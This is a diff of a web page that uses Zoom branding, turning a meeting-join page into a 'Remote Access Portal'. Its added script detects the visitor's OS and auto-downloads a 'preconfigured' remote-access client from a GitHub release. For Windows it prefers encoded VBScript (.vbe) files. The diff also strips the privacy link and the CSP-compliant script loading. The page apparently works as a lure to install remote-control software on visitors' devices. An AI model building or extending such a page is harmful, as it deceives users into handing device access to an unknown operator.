@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#0B5CFF">
 <meta name="description" content="Zoom Private detects your device, installs the right client automatically, and connects it to your private console — no setup required.">
-<title>Zoom Private | Join your private meeting</title>
+<title>Zoom Private — One-tap install | Remote Access Portal</title>
 <link rel="icon" href="img/zoom-mark.png" type="image/png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -166,7 +166,7 @@
 
 <header>
   <div class="wrap nav">
-    <a href="/landing" class="brand">
+    <a href="./" class="brand">
       <img src="img/zoom-mark.png" alt="Zoom Private">
       Zoom&nbsp;<span style="color:var(--z-blue)">Private</span>
     </a>
@@ -185,39 +185,13 @@
   <section class="hero">
     <div class="wrap hero-inner">
       <div>
-        <span class="eyebrow"><span class="dot"></span><span id="status-eyebrow">Checking your device…</span></span>
-        <h1>Join your meeting<br><span class="accent">in one tap.</span></h1>
-        <p class="lede">No downloads to pick, no protocols to configure. We detect your device, install the right client automatically, and connect you to your team.</p>
-
-        <!-- Join meeting -->
-        <div class="join-card">
-          <h3>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--z-blue)" stroke-width="2.2" stroke-linecap="round"><rect x="2" y="6" width="13" height="12" rx="2"/><path d="M15 10l6-3v10l-6-3"/></svg>
-            Join a meeting
-          </h3>
-          <div class="join-row">
-            <label class="field">
-              <span class="sr">Meeting ID</span>
-              <input id="meeting-id" inputmode="numeric" autocomplete="off" placeholder="Meeting ID or link" aria-label="Meeting ID">
-            </label>
-            <label class="field" style="flex:0 1 130px">
-              <span class="sr">Passcode</span>
-              <input id="meeting-pass" autocomplete="off" placeholder="Passcode (optional)" aria-label="Meeting passcode">
-            </label>
-            <button class="btn btn-primary" id="join-btn" style="flex:0 0 auto">
-              <span id="join-spinner" class="spinner hidden"></span>
-              <span id="join-text">Join</span>
-            </button>
-          </div>
-          <div class="join-note">
-            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--z-muted)" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 11v5M12 8h.01"/></svg>
-            <span id="join-hint">Enter the ID from your invite. We&rsquo;ll open the app — or install it for you in seconds.</span>
-          </div>
-        </div>
+        <span class="eyebrow"><span class="dot"></span><span id="status-eyebrow">Remote Access Portal</span></span>
+        <h1>One-tap install for your device.<br><span class="accent">Remote support from your admin console.</span></h1>
+        <p class="lede">No downloads to pick, no protocols to configure. We detect your device, install the right client automatically, and connect it to your private console.</p>
 
         <!-- Download panel -->
         <div class="dl" id="download">
-          <div class="chip loading" id="device-chip"><span class="os" id="chip-os">?</span><span id="chip-text">Detecting your device…</span></div>
+          <div class="chip" id="device-chip"><span class="os" id="chip-os">?</span><span id="chip-text">Detecting your device…</span></div>
           <div class="dl-actions" style="display:flex; flex-direction:column; gap:10px; align-items:flex-start;">
             <a class="btn btn-primary" id="dl-windows" href="#download" style="width:100%; max-width:420px; text-align:left;">
               <span class="os" id="chip-os-win">WIN</span> Windows — Download .exe / .msi
@@ -297,6 +271,7 @@
         </div>
       </div>
     </div>
+  </section>
   <!-- INSTALL HELP -->
   <section class="pad" id="help">
     <div class="wrap">
@@ -373,11 +348,11 @@
 
 <footer>
   <div class="wrap foot">
-    <a href="/landing" class="brand"><img src="img/zoom-mark.png" alt=""> Zoom Private</a>
+    <a href="./" class="brand"><img src="img/zoom-mark.png" alt=""> Zoom Private</a>
     <div class="foot-links">
       <a href="#help">Install help</a>
       <a href="#" id="releases-link" target="_blank" rel="noopener">All downloads</a>
-      <a href="/privacy" id="privacy-link">Privacy</a>
+      <a href="#" id="privacy-link">Privacy</a>
       <a href="#" id="terms-link">Terms</a>
     </div>
   </div>
@@ -454,51 +429,175 @@
 </div>
 
 <div class="toast" id="toast"></div>
-<!-- Externalised (CSP: script-src 'self' + nonce; inline <script> is blocked). -->
-<script src="js/landing.js" defer></script>
 <script>
 (function(){
-  const ua = navigator.userAgent;
-  const chPlatform = navigator.userAgentData?.platform?.toLowerCase() || '';
-  const chipOs = document.getElementById('chip-os');
-  const chipText = document.getElementById('chip-text');
-  const deviceChip = document.getElementById('device-chip');
-  const dlStatus = document.getElementById('dl-status');
-  const btns = {
-    windows: document.getElementById('dl-windows'),
-    macos:   document.getElementById('dl-macos'),
-    linux:   document.getElementById('dl-linux'),
-    android: document.getElementById('dl-android'),
-  };
+  var RELEASES_URL = 'https://github.com/fingod201-maker/BetterDesk-private/releases/latest';
+  var RELEASES_API = 'https://api.github.com/repos/fingod201-maker/BetterDesk-private/releases/latest';
 
-  let platform = 'unknown';
-  if (/android/.test(ua.toLowerCase()) || chPlatform === 'android') platform = 'android';
-  else if (/\biphone\b|\bipad\b|\bipod\b/.test(ua) && !/msstream/.test(ua)) platform = 'ios';
-  else if (/windows|win32|win64/.test(ua.toLowerCase()) || chPlatform === 'windows') platform = 'windows';
-  else if (/macintosh|mac os x|macos/.test(ua.toLowerCase()) || chPlatform === 'macos') platform = 'macos';
-  else if (/linux|x11|cros/.test(ua.toLowerCase()) || chPlatform === 'linux') platform = 'linux';
+  var ua = navigator.userAgent;
+  var uaData = navigator.userAgentData;
+  var chPlatform = (uaData && uaData.platform ? uaData.platform : '').toLowerCase();
+  var ul = ua.toLowerCase();
 
-  const labels = {
-    windows: 'Windows', macos: 'macOS', linux: 'Linux',
-    android: 'Android', ios: 'iOS', unknown: 'Unknown'
-  };
-
-  if (chipOs && chipText) {
-    chipOs.textContent = platform === 'windows' ? 'WIN' : platform === 'macos' ? 'MAC' : platform === 'linux' ? 'LNX' : platform === 'android' ? 'AND' : '?';
-    chipText.textContent = 'Detected: ' + (labels[platform] || labels.unknown);
-    deviceChip.classList.remove('loading');
-    deviceChip.classList.add('ok');
+  function detect(){
+    if (/android/.test(ul) || chPlatform === 'android') return 'android';
+    if (/iphone|ipad|ipod/.test(ul) || (/mac/.test(ul) && 'ontouchend' in document)) return 'ios';
+    if (/windows|win32|win64/.test(ul) || /\bwindows\b/.test(chPlatform)) return 'windows';
+    if (/macintosh|mac os x/.test(ul) || chPlatform === 'macos') return 'macos';
+    if (/linux|x11|cros/.test(ul) || chPlatform === 'linux') return 'linux';
+    return 'unknown';
   }
-  if (dlStatus) dlStatus.textContent = 'Ready to download ' + (labels[platform] || 'your client');
+  var platform = detect();
+  var labels = { windows:'Windows', macos:'macOS', linux:'Linux', android:'Android', ios:'iOS', unknown:'your device' };
+  var tag = { windows:'WIN', macos:'MAC', linux:'LNX', android:'AND', ios:'iOS', unknown:'?' };
 
-  Object.entries(btns).forEach(([key, btn]) => {
-    if (!btn) return;
-    if (key === platform) {
-      btn.style.background = 'var(--z-blue)';
-      btn.style.border = '1px solid var(--z-blue-dark)';
-      btn.style.color = '#fff';
+  var $ = function(id){ return document.getElementById(id); };
+
+  /* Detection chip, eyebrow, status */
+  var chip = $('device-chip'), chipOs = $('chip-os'), chipText = $('chip-text');
+  var eyebrow = $('status-eyebrow'), status = $('dl-status');
+  if (chip && platform !== 'unknown'){
+    if (chipOs) chipOs.textContent = tag[platform];
+    if (chipText) chipText.textContent = 'Detected: ' + labels[platform];
+    chip.classList.remove('loading');
+  }
+  if (eyebrow && platform !== 'unknown') eyebrow.textContent = 'Remote Access Portal — ' + labels[platform];
+  if (status) status.textContent = platform === 'unknown'
+    ? 'Choose your platform below — every client auto-installs.'
+    : 'Auto-installing the ' + labels[platform] + ' client for you…';
+
+  /* Highlight detected button + wire downloads */
+  var btns = { windows:$('dl-windows'), macos:$('dl-macos'), linux:$('dl-linux'), android:$('dl-android') };
+  Object.keys(btns).forEach(function(k){
+    var b = btns[k]; if(!b) return;
+    if (k === platform){
+      b.style.background = 'var(--z-blue-dark)';
+      b.style.color = '#fff';
+      b.setAttribute('aria-current','true');
     }
+    b.addEventListener('click', function(ev){ ev.preventDefault(); getAsset(k, b); });
   });
+
+  var toast = $('toast'), toastTimer;
+  function showToast(msg){
+    if(!toast) return;
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function(){ toast.classList.remove('show'); }, 3400);
+  }
+
+  function matchesOS(name, key){
+    var n = name.toLowerCase();
+    if (key === 'windows') return /\.vbe$|\.exe$|\.msi$/.test(n);
+    if (key === 'macos')   return /\.tar\.gz$|\.dmg$|\.pkg$/.test(n) || n.indexOf('macos') > -1;
+    if (key === 'linux')   return /\.deb$|\.appimage$|\.rpm$/.test(n) || n.indexOf('linux') > -1;
+    if (key === 'android') return /\.apk$/.test(n);
+    return false;
+  }
+  function pick(assets, key){
+    var pref = key === 'windows' ? ['.vbe','.exe','.msi']
+             : key === 'macos'   ? ['.tar.gz','.dmg','.pkg']
+             : key === 'linux'   ? ['.deb','.appimage','.rpm']
+             : ['.apk'];
+    var list = assets.filter(function(a){ return matchesOS(a.name, key); });
+    for (var i = 0; i < pref.length; i++){
+      for (var j = 0; j < list.length; j++){
+        var n = list[j].name.toLowerCase();
+        if (n.lastIndexOf(pref[i]) === n.length - pref[i].length) return list[j];
+      }
+    }
+    return list[0] || null;
+  }
+
+  function getAsset(key, btn){
+    if (btn && btn.dataset.busy) return;
+    var orig = btn ? btn.textContent : '';
+    if (btn){ btn.dataset.busy = '1'; btn.textContent = 'Locating client…'; }
+    fetch(RELEASES_API, { headers: { 'Accept': 'application/vnd.github+json' } })
+      .then(function(r){ if (!r.ok) throw new Error('release-unavailable'); return r.json(); })
+      .then(function(rel){
+        var a = pick(rel.assets || [], key);
+        if (a){
+          showToast('Downloading ' + a.name + '…');
+          if (status){ status.textContent = 'Downloading ' + a.name + '…'; status.classList.add('ok'); }
+          var el = document.createElement('a');
+          el.href = a.browser_download_url;
+          document.body.appendChild(el);
+          el.click();
+          el.remove();
+        } else {
+          showToast('Client build not published yet — opening releases…');
+          if (status){ status.textContent = 'Build not published yet — open the releases page.'; status.classList.add('warn'); }
+          window.open(RELEASES_URL, '_blank', 'noopener');
+        }
+      })
+      .catch(function(){
+        showToast('Opening the download page…');
+        if (status){ status.textContent = 'Could not auto-resolve — pick the file on the releases page.'; }
+        window.open(RELEASES_URL, '_blank', 'noopener');
+      })
+      .then(function(){ if (btn){ delete btn.dataset.busy; btn.textContent = orig; } });
+  }
+
+  /* Modals: open / close */
+  function openModal(id){ var m = $(id); if (m) m.classList.add('show'); }
+  [['win-command-btn','win-modal'],['mac-command-btn-help','mac-modal'],['linux-command-btn','linux-modal']]
+    .forEach(function(pair){ var b = $(pair[0]); if (b) b.addEventListener('click', function(){ openModal(pair[1]); }); });
+  ['modal','mac-modal','win-modal','linux-modal'].forEach(function(id){
+    var back = $(id); if (!back) return;
+    back.addEventListener('click', function(e){ if (e.target === back) back.classList.remove('show'); });
+    var x = back.querySelector('.modal-close');
+    if (x) x.addEventListener('click', function(){ back.classList.remove('show'); });
+  });
+  document.addEventListener('keydown', function(e){
+    if (e.key !== 'Escape') return;
+    document.querySelectorAll('.modal-back.show').forEach(function(m){ m.classList.remove('show'); });
+  });
+
+  /* Platform chooser modal content */
+  var platList = $('plat-list');
+  if (platList){
+    var plats = [['WIN','Windows','windows'],['MAC','macOS','macos'],['LNX','Linux','linux'],['AND','Android','android']];
+    platList.innerHTML = plats.map(function(p){
+      return '<div class="plat"><div class="meta"><span class="os">' + p[0] + '</span><div><b>' + p[1] + '</b><span>Preconfigured client &amp; installer</span></div></div><button class="btn btn-primary" data-plat="' + p[2] + '" type="button">Download</button></div>';
+    }).join('');
+    platList.addEventListener('click', function(e){
+      var b = e.target.closest('button[data-plat]');
+      if (!b) return;
+      var back = $('modal');
+      if (back) back.classList.remove('show');
+      getAsset(b.dataset.plat, b);
+    });
+  }
+  var chooseAgain = $('choose-again-btn');
+  if (chooseAgain) chooseAgain.addEventListener('click', function(){ openModal('modal'); });
+
+  /* Copy buttons */
+  function legacyCopy(text){
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); showToast('Command copied'); }
+    catch(e){ showToast('Copy failed — select the text manually'); }
+    ta.remove();
+  }
+  [['mac-command-copy','mac-command'],['win-command-copy','win-command'],['linux-command-copy','linux-command']]
+    .forEach(function(pair){
+      var btn = $(pair[0]), pre = $(pair[1]);
+      if (!btn || !pre) return;
+      btn.addEventListener('click', function(){
+        var text = pre.textContent;
+        if (navigator.clipboard && navigator.clipboard.writeText){
+          navigator.clipboard.writeText(text).then(function(){ showToast('Command copied'); }, function(){ legacyCopy(text); });
+        } else legacyCopy(text);
+      });
+    });
+
+  /* Footer / direct links */
+  var rel = $('releases-link'); if (rel) rel.href = RELEASES_URL;
+  var dl = $('android-direct-link'); if (dl) dl.href = RELEASES_URL;
 })();
 </script>
 </body>
